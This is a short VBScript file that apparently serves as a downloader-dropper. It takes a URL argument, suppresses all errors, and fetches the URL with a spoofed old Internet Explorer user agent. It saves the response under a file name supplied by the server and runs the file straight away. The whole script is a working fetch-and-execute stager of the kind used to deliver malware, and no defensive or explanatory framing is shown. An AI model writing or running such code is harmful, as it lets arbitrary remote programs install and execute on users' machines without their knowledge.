On Error Resume Next

Dim fileName
Dim url
Dim userAgent

Sub Run(ByVal sFile)
Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & sFile & Chr(34), 1, false
    Set shell = Nothing
End Sub

url = WScript.Arguments(0)
userAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US"

Set winHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
winHttp.Open "GET", url, False
winHttp.SetRequestHeader "User-Agent", userAgent
winHttp.Send()
If winHttp.Status = "200" Then
	fileName = winHttp.GetResponseHeader("Content-Disposition")
	fileName = Mid(fileName, InStr(fileName, "=")+1, Len(fileName))
	
	Set objADOStream = CreateObject("ADODB.Stream")
	objADOStream.Open
	objADOStream.Type = 1 'adTypeBinary

	objADOStream.Write winHttp.ResponseBody
	objADOStream.Position = 0    'Set the stream position to the start

	Set objFSO = Createobject("Scripting.FileSystemObject")
	If objFSO.Fileexists(fileName) Then objFSO.DeleteFile fileName
	Set objFSO = Nothing

	objADOStream.SaveToFile fileName
	objADOStream.Close
	Set objADOStream = Nothing
	Run fileName
 End If